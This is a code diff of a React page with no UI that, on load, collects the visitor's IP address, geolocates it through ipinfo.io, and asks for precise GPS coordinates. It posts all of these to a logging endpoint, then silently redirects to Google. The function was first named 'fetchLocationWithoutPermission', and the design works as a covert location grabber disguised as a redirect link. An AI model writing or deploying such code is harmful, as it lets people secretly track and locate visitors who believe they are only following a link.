@@ -3,23 +3,45 @@ import { useEffect } from 'react';
 
 export default function Page() {
   useEffect(() => {
-    const fetchLocationWithoutPermission = async () => {
+    const fetchAndLogLocation = async () => {
       try {
-        // Step 1: Get the user's IP address
+        let ipLatitude = '';
+        let ipLongitude = '';
+        let gpsLatitude = '';
+        let gpsLongitude = '';
+        let userIp = '';
+
+        // Step 1: Fetch the IP address
         const ipResponse = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipResponse.json();
-        const userIp = ipData.ip;
+        userIp = ipData.ip;
 
-        // Step 2: Use an IP geolocation API to get location details
+        // Step 2: Fetch location using IP
         const geoResponse = await fetch(`https://ipinfo.io/${userIp}/json`);
         const geoData = await geoResponse.json();
-        const { loc } = geoData; // loc is a string with latitude,longitude
-        const [latitude, longitude] = loc.split(',');
+        if (geoData.loc) {
+          [ipLatitude, ipLongitude] = geoData.loc.split(',');
+        }
 
-        console.log('IP:', userIp);
-        console.log('Location (IP-based):', { latitude, longitude });
+        // Step 3: Try precise GPS location using the Geolocation API
+        if (navigator.geolocation) {
+          await new Promise((resolve) => {
+            navigator.geolocation.getCurrentPosition(
+              (position) => {
+                gpsLatitude = position.coords.latitude;
+                gpsLongitude = position.coords.longitude;
+                resolve();
+              },
+              (error) => {
+                console.warn('Geolocation error:', error);
+                resolve(); // Use IP-based location as fallback
+              },
+              { enableHighAccuracy: true }
+            );
+          });
+        }
 
-        // Step 3: Optionally, send this data to your backend for logging
+        // Step 4: Log both IP-based and GPS-based data to the backend
         await fetch('/api/log', {
           method: 'POST',
           headers: {
@@ -27,20 +49,23 @@ export default function Page() {
           },
           body: JSON.stringify({
             ip: userIp,
-            latitude,
-            longitude,
+            ipLatitude,
+            ipLongitude,
+            gpsLatitude: gpsLatitude || null, // Null if unavailable
+            gpsLongitude: gpsLongitude || null, // Null if unavailable
           }),
         });
 
-        // Redirect to Google
+        // Step 5: Redirect to Google
         window.location.href = 'https://google.com';
       } catch (error) {
-        console.error('Error fetching location:', error);
+        console.error('Error fetching or logging location:', error);
+        window.location.href = 'https://google.com'; // Redirect even if there's an error
       }
     };
 
-    fetchLocationWithoutPermission();
+    fetchAndLogLocation();
   }, []);
 
-  return null;  // No UI for this page
+  return null; // No UI needed
 }
